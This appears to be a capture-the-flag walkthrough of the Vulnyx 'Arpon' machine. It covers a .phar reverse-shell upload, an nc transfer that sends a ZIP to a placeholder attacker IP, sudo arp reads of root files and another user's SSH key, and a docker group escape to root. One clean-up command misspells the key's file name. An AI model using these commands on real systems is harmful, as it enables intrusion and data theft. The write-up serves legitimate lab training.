# Vulnyx: Arpon

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `ManuelGRegal` |
| **Tools used** | `nmap` · `ffuf` · `nc` · `zip2john` · `john` · `arp` · `docker` |
| **Tags** | `#FileUpload` `#RCE` `#PasswordCracking` `#SSHKeyLeak` `#SudoAbuse` `#GTFOBins` `#DockerAbuse` |
| **URL** | https://vulnyx.com/machines/ |

A `.phar` upload in a backup section gets RCE. A password-protected ZIP recovered from a hidden directory holds an SSH key for `calabrote`, whose `sudo` access to `arp` — a documented GTFOBins file-read primitive — is used two ways: first as a shortcut to read both flags directly without a full shell, then more thoroughly to leak a second user's bash history, a script, and their SSH private key byte-by-byte through `arp`'s own error output. That key gets a real shell as `foque`, and membership in the `docker` group finishes the job with a full root shell.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn arpon.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:23:93:F5 (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV arpon.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 e1:85:8b:7b:6d:a2:6b:1a:ed:18:8e:08:a0:90:87:2a (ECDSA)
|_  256 ad:fe:77:78:a0:57:70:cc:33:68:b5:84:26:a3:b3:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Essex
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 08:00:27:23:93:F5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://arpon.nyx
```

<img src="../Images/arpon/Pasted image 20260823153138.png"/>

A content scan surfaces a `backup` directory, then a second scan against it turns up an `upload.php`:

```bash
$ ffuf -u http://arpon.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.php              [Status: 200, Size: 72627, Words: 3501, Lines: 811, Duration: 337ms]
.html                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 493ms]
index.html             [Status: 200, Size: 2447, Words: 286, Lines: 35, Duration: 563ms]
.php                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 626ms]
backup                 [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 0ms]
imagenes               [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 1ms]
.php                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 11ms]
.html                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 13ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 11ms]
```

```bash
$ ffuf -u http://arpon.nyx/backup/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 11ms]
index.html             [Status: 200, Size: 421, Words: 64, Lines: 16, Duration: 2ms]
.php                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 329ms]
upload.php             [Status: 200, Size: 17, Words: 3, Lines: 1, Duration: 2ms]
empty                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 3ms]
.php                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 10ms]
.html                  [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 13ms]
```

## Initial Access

### RCE via `.phar` Upload

A `.phar` file is uploaded through the backup section's own upload form:

```http
POST /backup/upload.php HTTP/1.1
Host: arpon.nyx
Content-Type: multipart/form-data; boundary=----geckoformboundary90e52be02d9d9023e20a8ebedaadf017

------geckoformboundary90e52be02d9d9023e20a8ebedaadf017
Content-Disposition: form-data; name="archivoSubido"; filename="rev_shell.phar"
Content-Type: text/plain

{...}

------geckoformboundary90e52be02d9d9023e20a8ebedaadf017
Content-Disposition: form-data; name="submit"

Subir Archivo
------geckoformboundary90e52be02d9d9023e20a8ebedaadf017--
```

Like on the other box in this set that used the same technique, `.phar` executes as PHP under the right server configuration, sidestepping a filter that only checks for `.php`. Requesting the uploaded file triggers it:

```bash
$ curl http://arpon.nyx/backup/empty/rev_shell.phar
```

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [arpon.nyx] 55356
Linux arpon 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
 14:44:39 up  1:07,  0 user,  load average: 0.00, 0.00, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (362): Inappropriate ioctl for device
bash: no job control in this shell
www-data@arpon:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Loot: A Hidden Backup Directory

Walking the web root turns up a `.hidden` directory under `backup/empty/` holding a password-protected ZIP:

```bash
www-data@arpon:/$ ls -l ~/html/
total 16
drwxr-xr-x    3 www-data www-data      4096 May 12  2024 backup
drwxr-xr-x    2 root     root          4096 May 13  2024 imagenes
-rw-r--r--    1 root     root          2447 May 13  2024 index.html
-rw-r--r--    1 root     root            20 May 12  2024 index.php
www-data@arpon:/$ ls -l ~/html/backup/
total 12
drwxr-xr-x    3 www-data www-data      4096 Aug 19 16:32 empty
-rw-r--r--    1 www-data www-data       421 May 12  2024 index.html
-rw-r--r--    1 www-data www-data       919 May 12  2024 upload.php
www-data@arpon:/$ ls -la ~/html/backup/empty/
total 180
drwxr-xr-x    3 www-data www-data      4096 Aug 19 16:32 .
drwxr-xr-x    3 www-data www-data      4096 May 12  2024 ..
drwxr-xr-x    2 www-data www-data      4096 May 13  2024 .hidden
-rw-r--r--    1 www-data www-data         1 May 12  2024 index.html
-rw-r--r--    1 www-data www-data      2700 Aug 23 14:43 rev_shell.phar
www-data@arpon:/$ ls -la ~/html/backup/empty/.hidden/
total 12
drwxr-xr-x    2 www-data www-data      4096 May 13  2024 .
drwxr-xr-x    3 www-data www-data      4096 Aug 19 16:32 ..
-rw-r--r--    1 www-data www-data      3090 May 12  2024 backup_id.zip
```

The archive is exfiltrated over a raw `nc` transfer:

```bash
# target
$ nc <ATTACKER_IP> <PORT> < backup_id.zip

# attacker
$ nc -lvp <PORT> > backup_id.zip
```

### Cracking the Archive

`zip2john` extracts the archive's password hash and `john` cracks it, revealing the ZIP holds an SSH key pair for `calabrote`:

```bash
$ zip2john backup_id.zip > backup_id.hash
$ john --show backup_id.hash
backup_id.zip:swordfish::backup_id.zip:id_rsa_calabrote.pub, id_rsa_calabrote:backup_id.zip

1 password hash cracked, 0 left
```

> **ZIP password:** `swordfish`

## Lateral Movement

### Shell as calabrote

The recovered private key logs straight in as `calabrote`:

```bash
$ ssh calabrote@arpon.nyx -i id_rsa_calabrote
calabrote@arpon:~$ id
uid=1001(calabrote) gid=1001(calabrote) grupos=1001(calabrote)
```

A check of `sudo` rights points at `arp`:

```bash
calabrote@arpon:~$ sudo -l
Matching Defaults entries for calabrote on arpon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User calabrote may run the following commands on arpon:
    (root) NOPASSWD: /usr/sbin/arp
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/arp/`

### Reading the Flags Directly via `arp` (Shortcut)

`calabrote` can run `/usr/sbin/arp` as root. In verbose mode, pointing `-f` at a file that isn't a valid ARP table makes `arp` try to parse it line by line — and echo back whatever it can't understand, including files it was never meant to expose:

```bash
calabrote@arpon:~$ sudo -u root /usr/sbin/arp -v -f /home/foque/user.txt
>> 4ce7368ace8130a6df2b47080dcdc16c
arp: format error on line 1 of etherfile /home/foque/user.txt !
```

```bash
calabrote@arpon:~$ sudo -u root /usr/sbin/arp -v -f /root/root.txt
>> 69db9f78edf072e03870a53b90aff647
arp: format error on line 1 of etherfile /root/root.txt !
```

> **User flag:** `4ce7368ace8130a6df2b47080dcdc16c`
> **Root flag:** `69db9f78edf072e03870a53b90aff647`

This alone technically retrieves both flags — but it's a read primitive, not a shell. The chain continues on to get an actual interactive foothold as `foque` and then root properly.

### Leaking a Full SSH Key via `arp`

The same technique is pointed at more of `foque`'s files — first the bash history and a referenced script, which name an SSH key used by a backup routine:

```bash
calabrote@arpon:~$ sudo -u root /usr/sbin/arp -v -f /home/foque/.bash_history
>> ls -lhF
ls: No existe ninguna dirección asociada al nombre
arp: cannot set entry on line 1 of etherfile /home/foque/.bash_history !
>> cat script_net_backup.sh
cat: No existe ninguna dirección asociada al nombre
arp: cannot set entry on line 2 of etherfile /home/foque/.bash_history !
>> chmod 755 script_net_backup.sh
chmod: `Host' desconocido
arp: cannot set entry on line 3 of etherfile /home/foque/.bash_history !
>> exit
arp: format error on line 4 of etherfile /home/foque/.bash_history !
>> history
arp: format error on line 5 of etherfile /home/foque/.bash_history !
>> docker run hello-world
docker: `Host' desconocido
arp: cannot set entry on line 6 of etherfile /home/foque/.bash_history !
```

```bash
calabrote@arpon:~$ sudo -u root /usr/sbin/arp -v -f /home/foque/script_net_backup.sh
>> cd /var/www/html
cd: No existe ninguna dirección asociada al nombre
arp: cannot set entry on line 2 of etherfile /home/foque/script_net_backup.sh !
>> tar czf /tmp/backup.tar.gz
tar: `Host' desconocido
arp: cannot set entry on line 3 of etherfile /home/foque/script_net_backup.sh !
>> scp -i /home/foque/.ssh/id_rsa_foque_script /tmp/backup.tar.gz 10.1.1.1@foque:backups/
scp: `Host' desconocido
arp: cannot set entry on line 4 of etherfile /home/foque/script_net_backup.sh !
>> rm /tmp/backup.tar.gz
rm: `Host' desconocido
arp: cannot set entry on line 5 of etherfile /home/foque/script_net_backup.sh !
```

The script points at `/home/foque/.ssh/id_rsa_foque_script`, so `arp` is aimed at the key itself — leaking it line by line:

```bash
calabrote@arpon:~$ sudo -u root /usr/sbin/arp -v -f /home/foque/.ssh/id_rsa_foque_script
>> -----BEGIN OPENSSH PRIVATE KEY-----
arp: cannot set entry on line 1 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
arp: format error on line 2 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> NhAAAAAWEAAQAAAgEAkVhG0Fz+OiyVplhjGAXjOH/UjTvKIhOmps2VbpnSgFJFEQvILdd
arp: format error on line 3 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> +9NAQd4rPY393GxElFxms5T5yYGORuTgZZoc8Ch8rJC7GNTLZZIpR8xTiRFuSNwgZlg/4z
arp: format error on line 4 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> ah8vWBEh4vHt5D+WtI4d4dLKcdYOCPPi3FNs1EV529u+QkT/BLiCw82LosaQbttM6FAZJh
arp: format error on line 5 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> DhtJwxLaA7XbMTfRXMnkpEd4D05hkJ40GqI51EDeIxrFDccxs2MoiHPJyX2gQP2BxSgLm1
arp: format error on line 6 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> 2uwX/iLj9ayDoJlRD/qKoJ7wQiJKjsLzKiKbZ/4K24jrNjtm718+hYsrFyKRWhcpIFawzY
arp: format error on line 7 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> qgHrEiL5ulqbWGoZHozOFMThItvU4330x71oaLAvNh6kxZ8n+2dEwWys6zc8jmajwF0k6x
arp: format error on line 8 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> XUC5S6sv5V0dQ295CfwRrixfOUFtMDX8uHx2ke3V7T2VSRgK89Pb2VyL/4jPSCQEwFivI6
arp: format error on line 9 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> x08GIcKypOa7FBS4Dbgs3F6DQmydD/hnWlT0w+4bep0sPBQf7l0wqC69VhM8Vw8BdoJ1F8
arp: format error on line 10 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> oKfPyBj9srWUV0QDco2lC62cCBFxqthyUAjOHONCL5XAXgUexBuzQ4LCJOIWISijc6LkR
arp: format error on line 11 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> 7/qAo+D773VY080sB0c7cOvpNd5VUbOKPsJOt3nsn0CHRyGXz4/QhDuBNVgLvbGY+q+6yv
arp: format error on line 12 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> kAAAc4V7ULUVe1C1EAAAAHc3NoLXJzYQAAAgEAkVhG0Fz+OiyVplhjGAXjOH/UjTvKIhOm
arp: format error on line 13 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> ps2VbpnSgFJFEQvILdd+9NAQd4rPY393GxElFxms5T5yYGORuTgZZoc8Ch8rJC7GNTLZZ
arp: format error on line 14 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> IpR8xTiRFuSNwgZlg/4zah8vWBEh4vHt5D+WtI4d4dLKcdYOCPPi3FNs1EV529u+QkT/BL
arp: format error on line 15 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> iCw82LosaQbttM6FAZJhDhtJwxLaA7XbMTfRXMnkpEd4D05hkJ40GqI51EDeIxrFDccxs2
arp: format error on line 16 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> MoiHPJyX2gQP2BxSgLm1uwX/iLj9ayDoJlRD/qKoJ7wQiJKjsLzKiKbZ/4K24jrNjtm71
arp: format error on line 17 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> 8+hYsrFyKRWhcpIFawzYqgHrEiL5ulqbWGoZHozOFMThItvU4330x71oaLAvNh6kxZ8n+2
arp: format error on line 18 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> dEwWys6zc8jmajwF0k6xXUC5S6sv5V0dQ295CfwRrixfOUFtMDX8uHx2ke3V7T2VSRgK89
arp: format error on line 19 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> Pb2VyL/4jPSCQEwFivI6x08GIcKypOa7FBS4Dbgs3F6DQmydD/hnWlT0w+4bep0sPBQf7l
arp: format error on line 20 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> 0wqC69VhM8Vw8BdoJ1F8oKfPyBj9srWUV0QDco2lC62cCBFxqthyUAjOHONCL5XAXgUex
arp: format error on line 21 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> BuzQ4LCJOIWISijc6LkR7/qAo+D773VY080sB0c7cOvpNd5VUbOKPsJOt3nsn0CHRyGXz4
arp: format error on line 22 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> /QhDuBNVgLvbGY+q+6yvkAAAADAQABAAACAAPGLcFBi5e+G0cYxoah/dXFAejALXB7JtV
arp: format error on line 23 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> tHUzinCtTQHn1Ib3ogVWCjpgE8eZ8GF5zU129i5/3D3gz2jktdNx9D8lO4rJe9dzI0W3S
arp: format error on line 24 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> k82KYzJIMd6wEjSFesoAVp0UG2BhFFcRJSz0Nqqnl9mCqOCn63AoMLN7vP5ihrulsoxpqC
arp: format error on line 25 of etherfile /home/foque/.ssh/id_rsa_foque_script !
>> 30CX52rTP+CqLYgnAnSnPsejOW4ggxaUPkTyNWZBZ3jgr7SMSMTfONNFldahkImDPobRx
```

`arp`'s own parsing noise (the literal word "arp", "Host" labels, and stray `>>` characters from its error formatting) is stripped out of the leaked output, leaving just the base64-encoded key body:

```bash
$ cat foque_rsa | grep -v -e arp -e Host | tr -d '>>' > foque_rsa_clean
$ sed 's/^[[:space:]]*//;s/[[:space:]]*$//' foque_rsa_clean > foque_rsa_clean_1
$ mv forque_rsa_clean_1 forque_rsa_clean
$ tail -n +2 foque_rsa_clean | head -n -1 | base64 -d > /dev/null && echo "Base64 OK" || echo "Base64 corrupted"
$ chmod 600 foque_rsa_clean
```

The `base64 -d ... > /dev/null` step is a validity check — it doesn't save the decoded output, just confirms the cleaned-up text actually decodes without errors before trusting it as a usable key.

### Shell as foque

```bash
$ ssh foque@arpon.nyx -i foque_rsa_clean
foque@arpon:~$ id
uid=1002(foque) gid=1002(foque) grupos=1002(foque),996(docker)
foque@arpon:~$ ls -l /home/foque
total 8
-rwxr-xr-x    1 foque    foque          163 may 12  2024 script_net_backup.sh
-rw-r--r--    1 foque    foque           33 may 12  2024 user.txt
foque@arpon:~$ cat /home/foque/user.txt
4ce7368ace8130a6df2b47080dcdc16c
```

> **User flag:** `4ce7368ace8130a6df2b47080dcdc16c`

This confirms the same user flag recovered earlier via the direct `arp` read.

## Privilege Escalation

### Root via Docker Group Abuse

`foque`'s membership in the `docker` group is equivalent to root on the host — a container started from `alpine` runs as root inside its own namespace, and mounting the host's root filesystem in makes it directly writable; `chroot`-ing into that mount treats the host filesystem as the container's own root, the same technique used on the other Docker-based box in this set:

```bash
foque@arpon:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -l /root
total 8
-rw-r--r--    1 root     root          2201 May 13  2024 esses_no.html
-rw-r--r--    1 root     root            33 May 13  2024 root.txt
# cat /root/root.txt
69db9f78edf072e03870a53b90aff647
```

This confirms the same root flag recovered earlier via the direct `arp` read.

## Takeaways

- `arp -v -f <file>`, when runnable as another user via `sudo`, is a documented GTFOBins file-read primitive — its verbose error handling on a malformed "ARP table" leaks the file's actual contents.
- A file-read primitive is often enough to grab a CTF's flags directly without ever reaching a full shell as the target user — but a real assessment usually calls for going further, since a flag alone doesn't demonstrate persistent access the way an actual shell does.
- Reconstructing structured data (a private key, in this case) from a noisy leak channel is a skill on its own — stripping known noise patterns out of `arp`'s error formatting and validating the result as base64 before trusting it is exactly the kind of care that separates "got some bytes out" from "recovered something usable."